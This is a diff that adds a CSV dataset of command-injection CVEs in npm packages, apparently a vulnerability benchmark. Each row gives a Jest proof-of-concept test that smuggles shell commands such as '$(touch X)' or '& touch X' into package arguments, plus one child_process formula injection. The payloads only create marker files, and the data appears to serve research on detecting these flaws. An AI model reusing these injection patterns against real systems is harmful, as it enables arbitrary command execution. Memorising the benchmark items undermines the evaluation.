@@ -1,0 +1,2512 @@
+Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
+command-injection,CVE-2018-3746,pdfinfojs,0.3.6,0.4.1,command-injection/pdfinfojs_0.3.6,"test(""Command Injection in pdfinfojs"", (done) => {
+  expect.assertions(2);
+  const pdfinfo = require(""pdfinfojs"");
+  const fs = require(""fs"");
+  const path = ""./pdfinfojs"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  pdf = new pdfinfo(""$(touch pdfinfojs)"");
+  pdf.getInfo(function (err, info, params) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/pdfinfo.js:47:23,https://security.snyk.io/vuln/npm:pdfinfojs:20180409; https://github.com/advisories/GHSA-3pxp-6963-46r9
+command-injection,CVE-2019-10788,find-process,1.4.4,n/a,command-injection/find-process_1.4.4,"test(""Command Injection in find-process"", () => {
+  expect.assertions(1);
+  const find = require(""find-process"");
+  const fs = require(""fs"");
+  const path = ""./find-process"";
+  const command = ""$(touch find-process)"";
+  return find(""pid"", command).then(
+    function (list) {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    },
+    function (err) {
+      console.log(err.stack || err);
+    }
+  );
+});
+",https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639,lib/utils.js:19:8,https://security.snyk.io/vuln/SNYK-JS-FINDPROCESS-1090284; https://github.com/advisories/GHSA-qfxv-qqvg-24pg
+command-injection,CVE-2021-23374,ps-visitor,0.0.2,n/a,command-injection/ps-visitor_0.0.2,"test(""Command Injection in ps-visitor"", () => {
+  expect.assertions(2);
+  const ps_visitor = require(""ps-visitor"");
+  const fs = require(""fs"");
+  const path = ""./ps-visitor"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  let file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return ps_visitor.kill(""$(touch ps-visitor)"").catch(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {});
+  });
+});
+",n/a,index.js:404:10,https://security.snyk.io/vuln/SNYK-JS-PSVISITOR-1078544; https://github.com/advisories/GHSA-v2jv-33gh-xx29
+command-injection,CVE-2021-21412,@thi.ng/egf,0.3.0,0.4.0,command-injection/thi.ng-egf_0.3.0,"test(""Command Injection in @thi.ng/egf"", () => {
+  expect.assertions(2);
+  const egf = require(""@thi.ng/egf"");
+  const fs = require(""fs"");
+  const path = ""./egf"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    egf.BUILTINS.gpg(""foo"", ""bar`touch egf`"", { opts: { decrypt: true } });
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/thi-ng/umbrella/commit/88f61656e5f5cfba960013b8133186389efaf243,lib/index.js:157:29,https://security.snyk.io/vuln/SNYK-JS-THINGEGF-1089810; https://github.com/advisories/GHSA-rj44-gpjc-29r7
+command-injection,CVE-2020-28494,total.js,3.4.6,3.4.7,command-injection/total.js_3.4.6,"test(""Command Injection in total.js"", (done) => {
+  expect.assertions(2);
+  const total = require(""total.js"");
+  const fs = require(""fs"");
+  const path = ""./total_js"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let image = Image.load("""");
+  let payload = "";touch total_js;"";
+  var timetaken = ""Time taken by addCount function"";
+  console.time(timetaken);
+  image.stream(payload);
+  console.timeEnd(timetaken);
+  setTimeout(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {
+      done();
+    });
+  }, 1000);
+});
+",https://github.com/totaljs/framework/commit/6192491ab2631e7c1d317c221f18ea613e2c18a5,image.js:329:12,https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1046672; https://github.com/advisories/GHSA-4449-hg37-77v8
+command-injection,CVE-2020-7613,clamscan,1.2.0,1.3.0,command-injection/clamscan_1.2.0,"test(""Command Injection in clamscan"", () => {
+  expect.assertions(2);
+  const Root = require(""clamscan"");
+  const fs = require(""fs"");
+  const path = ""./clamscan"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  var attack_code = ""touch clamscan"";
+  var root = new Root();
+  fs.mkdir(attack_code + ""&"", function () {});
+  return root
+    .init({ clamscan: { path: attack_code + ""&"" } })
+    .then(() => {})
+    .catch((err) => {})
+    .finally(() => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+});
+",https://github.com/kylefarris/clamscan/commit/5f557c970817fe8c578ec3f7ad3bcbcef4cf5538,index.js:495:36,https://security.snyk.io/vuln/SNYK-JS-CLAMSCAN-564113; 
+command-injection,CVE-2020-7635,compass-compile,0.0.1,n/a,command-injection/compass-compile_0.0.1,"test(""Command Injection in compass-compile"", () => {
+  expect.assertions(2);
+  const Root = require(""compass-compile"");
+  let root = new Root();
+  const fs = require(""fs"");
+  const path = ""./compass-compile"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let options = { compassCommand: ""touch compass-compile"" };
+  return root
+    .compile(options)
+    .then(() => {})
+    .catch((err) => {})
+    .finally(() => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+});
+",n/a,lib/compass.js:25:5,https://security.snyk.io/vuln/SNYK-JS-COMPASSCOMPILE-564429; https://github.com/advisories/GHSA-7q9f-x6rm-qmxr
+command-injection,CVE-2018-16462,diskstats,0.0.2,2.0.1,command-injection/diskstats_0.0.2,"test(""Command Injection in diskstats"", (done) => {
+  expect.assertions(2);
+  const diskstats = require(""diskstats"");
+  const fs = require(""fs"");
+  const path = ""./diskstats"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  diskstats.check(""; touch diskstats"", () => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlinkSync(path);
+    done();
+  });
+});
+",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,lib/stat.js:44:22,https://security.snyk.io/vuln/SNYK-JS-DISKSTATS-590099; https://github.com/advisories/GHSA-9jm3-5835-537m
+command-injection,CVE-2019-10789,curling,0.2.0,1.1.0,command-injection/curling_0.2.0,"test(""Command Injection in curling"", (done) => {
+  expect.assertions(2);
+  const root = require(""curling"");
+  const fs = require(""fs"");
+  const path = ""./curling"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  root.run(""& touch curling"", function (err) {
+    if (err) throw err;
+    else {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+      done();
+    }
+  });
+});
+",n/a,lib/curl-transport.js:56:3,https://security.snyk.io/vuln/SNYK-JS-CURLING-546484; https://github.com/advisories/GHSA-xmxh-g7wj-8m4m
+command-injection,CVE-2020-7633,apiconnect-cli-plugins,6.0.2,n/a,command-injection/apiconnect-cli-plugins_6.0.2,"test(""Command Injection in apiconnect-cli-plugins"", () => {
+  expect.assertions(2);
+  const root = require(""apiconnect-cli-plugins"");
+  const fs = require(""fs"");
+  const path = ""./apiconnect-cli-plugins"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let payload = ""& touch apiconnect-cli-plugins &"";
+  return root.pluginLoader.installPlugin(payload, """").catch(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,lib/plugin-loader.js:181:18,https://security.snyk.io/vuln/SNYK-JS-APICONNECTCLIPLUGINS-564427; 
+command-injection,CVE-2020-28425,curljs,0.1.2,n/a,command-injection/curljs_0.1.2,"test(""Command Injection in curljs"", (done) => {
+  expect.assertions(2);
+  const a = require(""curljs"");
+  const fs = require(""fs"");
+  const path = ""./curljs"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a(""' & touch curljs # '"", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,index.js:37:12,https://security.snyk.io/vuln/SNYK-JS-CURLJS-1050404; 
+command-injection,,gity,1.0.5,n/a,command-injection/gity_1.0.5,"test(""Remote code execution in gity"", (done) => {
+  expect.assertions(2);
+  const Git = require(""gity"");
+  const fs = require(""fs"");
+  const path = ""./gity"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    let git = Git()
+      .add(""*.js"")
+      .commit('-m ""added js files"";touch gity;#')
+      .run(() => {
+        file_exist = fs.existsSync(path);
+        expect(file_exist).toBe(true);
+        fs.unlink(path, function (err) {
+          done();
+        });
+      });
+  } catch (error) {}
+});
+",n/a,lib/index.js:90:7,https://security.snyk.io/vuln/SNYK-JS-GITY-1012730; 
+command-injection,CVE-2020-8132,pdf-image,2.0.0,n/a,command-injection/pdf-image_2.0.0,"test(""Remote code execution in pdf-image"", () => {
+  expect.assertions(2);
+  var PDFImage = require(""pdf-image"").PDFImage;
+  const fs = require(""fs"");
+  const path = ""./pdf-image_2"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    let pdfImage = new PDFImage('""; touch pdf-image_2 #""');
+    return pdfImage.getInfo().finally(() => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+  } catch (error) {}
+});
+",n/a,index.js:44:7,https://security.snyk.io/vuln/SNYK-JS-PDFIMAGE-551984; https://github.com/advisories/GHSA-rv7p-mmwq-x674
+command-injection,CVE-2021-24033,react-dev-utils,11.0.0,11.0.4,command-injection/react-dev-utils_11.0.0,"test(""Command Injection in react-dev-utils"", () => {
+  expect.assertions(2);
+  const getProcessForPort = require(""react-dev-utils/getProcessForPort"");
+  const fs = require(""fs"");
+  const path = ""./react-dev-utils"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  getProcessForPort(""11;$(touch react-dev-utils)"");
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,getProcessForPort.js:28:10,https://security.snyk.io/vuln/SNYK-JS-REACTDEVUTILS-1083268; https://github.com/advisories/GHSA-5q6m-3h65-w53x
+command-injection,CVE-2021-26543,git-parse,1.0.4,1.0.5,command-injection/git-parse_1.0.4,"test(""Command Injection in git-parse"", () => {
+  expect.assertions(2);
+  const x = require(""git-parse"");
+  const fs = require(""fs"");
+  const path = ""./git-parse"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  const paths = "". || touch git-parse"";
+  return x.gitDiff(""."", 445454, 1545, paths).finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,src/git_diff.js:13:3,https://security.snyk.io/vuln/SNYK-JS-GITPARSE-1290380; 
+command-injection,CVE-2021-23375,psnode,0.0.1,n/a,command-injection/psnode_0.0.1,"test(""Command Injection in psnode"", (done) => {
+  expect.assertions(2);
+  const psnode = require(""psnode"");
+  const fs = require(""fs"");
+  const path = ""./psnode"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  let file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  psnode.kill(""$(touch psnode)"", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {
+      done();
+    });
+  });
+});
+",n/a,lib/index.js:59:16,https://security.snyk.io/vuln/SNYK-JS-PSNODE-1078543; https://github.com/advisories/GHSA-m8fm-mv5w-33pv
+command-injection,CVE-2019-10807,blamer,0.1.13,1.0.1,command-injection/blamer_0.1.13,"test(""Command Injection in blamer"", async () => {
+  expect.assertions(2);
+  const Root = require(""blamer"");
+  const fs = require(""fs"");
+  const path = ""./blamer"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let attack_command = ""& touch blamer &"";
+  root = new Root(""git"", attack_command);
+  try {
+    await root.blameByFile(""./"");
+  } catch (err) {
+  } finally {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  }
+});
+",https://github.com/kucherenko/blamer/commit/5fada8c9b6986ecd28942b724fa682e77ce1e11c,src/vcs/git.js:24:5,https://security.snyk.io/vuln/SNYK-JS-BLAMER-559541; https://github.com/advisories/GHSA-7vm7-j8p7-h346
+command-injection,CVE-2020-7786,macfromip,1.1.1,n/a,command-injection/macfromip_1.1.1,"test(""Command Injection in macfromip"", (done) => {
+  expect.assertions(2);
+  const a = require(""macfromip"");
+  const fs = require(""fs"");
+  const path = ""./macfromip"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a.getMacInLinux(""& touch macfromip"", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/bcamarneiro/macfromip/commit/1bbed8cd6f8299ad2e9d028e0ed0771340ab8391,macfromip.js:66:15,https://security.snyk.io/vuln/SNYK-JS-MACFROMIP-1048336; https://github.com/advisories/GHSA-vh8f-xw5v-8993
+command-injection,,freespace,1.0.4,n/a,command-injection/freespace_1.0.4,"test(""Command Injection in freespace"", () => {
+  expect.assertions(2);
+  const freespace = require(""freespace"");
+  const fs = require(""fs"");
+  const path = ""./freespace"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return freespace.check(""/ ; touch freespace"").finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,index.js:51:16,https://security.snyk.io/vuln/SNYK-JS-FREESPACE-1018705; 
+command-injection,CVE-2020-28434,gitblame,0.1.1,n/a,command-injection/gitblame_0.1.1,"test(""Command Injection in gitblame"", (done) => {
+  expect.assertions(2);
+  const a = require(""gitblame"");
+  const fs = require(""fs"");
+  const path = ""./gitblame"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a(""& touch gitblame"", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/gitblame.js:15:3,https://security.snyk.io/vuln/SNYK-JS-GITBLAME-1050430; 
+command-injection,CVE-2019-10802,giting,0.0.7,0.0.8,command-injection/giting_0.0.7,"test(""Command Injection in giting"", (done) => {
+  expect.assertions(2);
+  const Test = require(""giting"");
+  const fs = require(""fs"");
+  const path = ""./giting"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let injection_command = "";touch giting;"";
+  test = new Test({ workDir: ""./"" });
+  repo = {
+    organization: ""./"",
+    name: ""./"",
+    branch: injection_command,
+  };
+  test.pull(repo, function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/MangoRaft/git/commit/9be41081f547d3dcef25e7d7c957bc2a3be2dfe0,lib/git.js:223:8,https://security.snyk.io/vuln/SNYK-JS-GITING-559008; https://github.com/advisories/GHSA-53xj-v576-3ch2
+command-injection,CVE-2020-28445,npm-help,1.0.0,n/a,command-injection/npm-help_1.0.0,"test(""Command Injection in npm-help"", () => {
+  expect.assertions(2);
+  const root = require(""npm-help"");
+  const fs = require(""fs"");
+  const path = ""./npm-help"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  var module = ""& touch npm-help"";
+  root.latestVersion(module);
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlinkSync(""./version"");
+  fs.unlink(path, function (err) {});
+});
+",n/a,index.js:13:22,https://security.snyk.io/vuln/SNYK-JS-NPMHELP-1050983; 
+command-injection,CVE-2014-9682,dns-sync,0.1.0,0.1.3,command-injection/dns-sync_0.1.0,"test(""Command Injection in dns-sync"", () => {
+  expect.assertions(2);
+  const dnsSync = require(""dns-sync"");
+  const fs = require(""fs"");
+  const path = ""./dns-sync"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  dnsSync.resolve(""$(touch dns-sync)"");
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/skoranga/node-dns-sync/commit/d9abaae384b198db1095735ad9c1c73d7b890a0d,lib/dns-sync.js:21:26,https://security.snyk.io/vuln/npm:dns-sync:20141111; https://github.com/advisories/GHSA-q5pq-pgrv-fh89
+command-injection,,arpping,2.0.0,3.0.0,command-injection/arpping_2.0.0,"test(""Remote code execution in arpping"", () => {
+  expect.assertions(2);
+  const Arpping = require(""arpping"");
+  const fs = require(""fs"");
+  const path = ""./arpping"";
+  let arpping = new Arpping();
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return arpping
+    .ping(["";touch arpping;""])
+    .then(() => {})
+    .catch((err) => console.log(err))
+    .finally(() => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+});
+",https://github.com/haf-decent/arpping/commit/0db06723f8c3c73a5cc0829c667d45cba25ca44d,index.js:120:13,https://security.snyk.io/vuln/SNYK-JS-ARPPING-1060047; 
+command-injection,CVE-2020-7784,ts-process-promises,1.0.2,n/a,command-injection/ts-process-promises_1.0.2,"test(""Command Injection in ts-process-promises"", () => {
+  expect.assertions(2);
+  const a = require(""ts-process-promises"");
+  const fs = require(""fs"");
+  const path = ""./ts-process-promises"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return a.exec(""touch ts-process-promises"", {}).finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,lib/process-promises.js:45:31,https://security.snyk.io/vuln/SNYK-JS-TSPROCESSPROMISES-1048334; https://github.com/advisories/GHSA-ww4j-c2rq-47q8
+command-injection,CVE-2020-7630,git-add-remote,1.0.0,n/a,command-injection/git-add-remote_1.0.0,"test(""Command Injection in git-add-remote"", (done) => {
+  expect.assertions(2);
+  const root = require(""git-add-remote"")();
+  const fs = require(""fs"");
+  const path = ""./git-add-remote"";
+  let payload = ""& touch git-add-remote"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  root(payload, """", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,index.js:21:8,https://security.snyk.io/vuln/SNYK-JS-GITADDREMOTE-564269; 
+command-injection,CVE-2020-7631,diskusage-ng,0.2.6,1.0.0,command-injection/diskusage-ng_0.2.6,"test(""Command Injection in diskusage-ng"", (done) => {
+  expect.assertions(2);
+  const root = require(""diskusage-ng"");
+  const fs = require(""fs"");
+  const path = ""./diskusage-ng"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  root(['""&touch diskusage-ng""'], () => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlinkSync(path);
+    done();
+  });
+});
+",https://github.com/iximiuz/node-diskusage-ng/commit/48e7e093486b528f0c81ec699573e0e4a431b8d3#diff-38182cfe286a150ebcc88df0ec57ed66,lib/posix.js:11:5,https://security.snyk.io/vuln/SNYK-JS-DISKUSAGENG-564425; https://github.com/advisories/GHSA-3269-x4pw-vffg
+command-injection,CVE-2020-7781,connection-tester,0.2.0,0.2.1,command-injection/connection-tester_0.2.0,"test(""Command Injection in connection-tester"", () => {
+  expect.assertions(2);
+  const a = require(""connection-tester"");
+  const fs = require(""fs"");
+  const path = ""./connection-tester"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    a.test(""& touch connection-tester"", 123, 1000);
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlinkSync(path);
+  fs.unlinkSync(""1000"");
+  fs.unlinkSync(""123"");
+});
+",n/a,index.js:15:28,https://security.snyk.io/vuln/SNYK-JS-CONNECTIONTESTER-1048337; https://github.com/advisories/GHSA-w5mp-8p8w-mhh8
+command-injection,CVE-2020-6836,hot-formula-parser,3.0.0,3.0.1,command-injection/hot-formula-parser_3.0.0,"test(""Command Injection in hot-formula-parser"", () => {
+  expect.assertions(2);
+  const FormulaParser = require(""hot-formula-parser"").Parser;
+  const fs = require(""fs"");
+  const path = ""./hot-formula-parser"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let parser = new FormulaParser();
+  parser.parse(
+    ""SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])""
+  );
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/handsontable/formula-parser/commit/396b089738d4bf30eb570a4fe6a188affa95cd5e,lib/grammar-parser/grammar-parser.js:258:31,https://security.snyk.io/vuln/SNYK-JS-HOTFORMULAPARSER-541328; https://github.com/advisories/GHSA-rc77-xxq6-4mff
+command-injection,CVE-2021-23380,roar-pidusage,1.1.6,n/a,command-injection/roar-pidusage_1.1.6,"test(""Command Injection in roar-pidusage"", (done) => {
+  expect.assertions(1);
+  const os = require(""os"");
+  os.platform = () => {
+    return ""freebsd"";
+  };
+  const roar_pidusage = require(""roar-pidusage"");
+  const fs = require(""fs"");
+  const path = ""./roar-pidusage"";
+  roar_pidusage.stat(""$(touch roar-pidusage)"", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/stats.js:103:5,https://security.snyk.io/vuln/SNYK-JS-ROARPIDUSAGE-1078528; https://github.com/advisories/GHSA-xfxf-qw26-hr33
+command-injection,CVE-2018-16461,libnmap,0.4.11,0.4.16,command-injection/libnmap_0.4.11,"test(""Command Injection in libnmap"", (done) => {
+  expect.assertions(2);
+  const nmap = require(""libnmap"");
+  const fs = require(""fs"");
+  const path = ""./libnmap"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  const opts = {
+    range: [""scanme.nmap.org"", ""x.x.$(touch libnmap)""],
+  };
+  nmap.scan(opts, function (err, report) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/jas-/node-libnmap/commit/c235b24b0342e12a5dbf502f89daabe95883b6c8,lib/classes/tools.js:114:25,https://security.snyk.io/vuln/SNYK-JS-LIBNMAP-72551; https://github.com/advisories/GHSA-7g2w-6r25-2j7p
+command-injection,CVE-2020-7636,git-tags-remote,1.0.2,n/a,command-injection/git-tags-remote_1.0.2,"test(""Command Injection in git-tags-remote"", () => {
+  expect.assertions(2);
+  const gitTagsRemote = require(""git-tags-remote"");
+  const fs = require(""fs"");
+  const path = ""./git-tags-remote"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return gitTagsRemote
+    .get(
+      ""https://github.com/sh0ji/git-tags-remote.git; touch git-tags-remote > /tmp/command-injection.test""
+    )
+    .finally((tags) => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+});
+",n/a,index.js:5:2,https://security.snyk.io/vuln/SNYK-JS-GITTAGSREMOTE-596503; https://github.com/advisories/GHSA-4m6q-rxhm-675w
+command-injection,,open,0.0.5,6.0.0,command-injection/open_0.0.5,"test(""Command Injection in open"", (done) => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const path = ""./open"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  require(""open"")('""""`touch open`');
+  setTimeout(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {
+      done();
+    });
+  }, 500);
+});
+",,lib/open.js:58:10,https://security.snyk.io/vuln/npm:open:20180512; https://github.com/advisories/GHSA-28xh-wpgr-7fm8
+command-injection,CVE-2021-23381,killing,1.0.6,n/a,command-injection/killing_1.0.6,"test(""Command Injection in killing"", (done) => {
+  const killing = require(""killing"");
+  const fs = require(""fs"");
+  const path = ""./killing"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  let file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  killing(""$(touch killing & exit 1)"");
+  setTimeout(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {
+      done();
+    });
+  }, 500);
+});
+",n/a,lib/killing.js:35:7,https://security.snyk.io/vuln/SNYK-JS-KILLING-1078532; https://github.com/advisories/GHSA-cq77-8jpx-892g
+command-injection,CVE-2018-16462,apex-publish-static-files,2.0.0,2.0.1,command-injection/apex-publish-static-files_2.0.0,"test(""Command Injection in apex-publish-static-files"", () => {
+  expect.assertions(2);
